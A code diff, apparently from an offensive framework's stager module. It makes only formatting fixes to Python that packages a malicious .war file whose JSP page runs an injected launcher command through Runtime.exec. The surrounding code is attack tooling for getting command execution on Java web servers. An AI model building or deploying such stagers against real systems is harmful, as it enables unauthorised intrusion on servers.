@@ -2,6 +2,7 @@ from lib.common import helpers
 import zipfile
 import StringIO
 
+
 class Stager:
 
     def __init__(self, mainMenu, params=[]):
@@ -64,7 +65,6 @@ class Stager:
             if option in self.options:
                 self.options[option]['Value'] = value
 
-
     def generate(self):
 
         # extract all of our options
@@ -87,7 +87,7 @@ class Stager:
 
         else:
 
-            launcher = launcher.replace('"','\\"')
+            launcher = launcher.replace('"', '\\"')
 
             # .war manifest
             manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"
@@ -110,10 +110,10 @@ Process p=Runtime.getRuntime().exec("'''+str(launcher)+'''");
 <jsp-file>/%s.jsp</jsp-file>
 </servlet>
 </web-app>
-''' %(appName, appName)
+''' % (appName, appName)
 
             # build the in-memory ZIP and write the three files in
-            warFile = StringIO.StringIO() 
+            warFile = StringIO.StringIO()
             zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)
 
             zipData.writestr("META-INF/MANIFEST.MF", manifest)
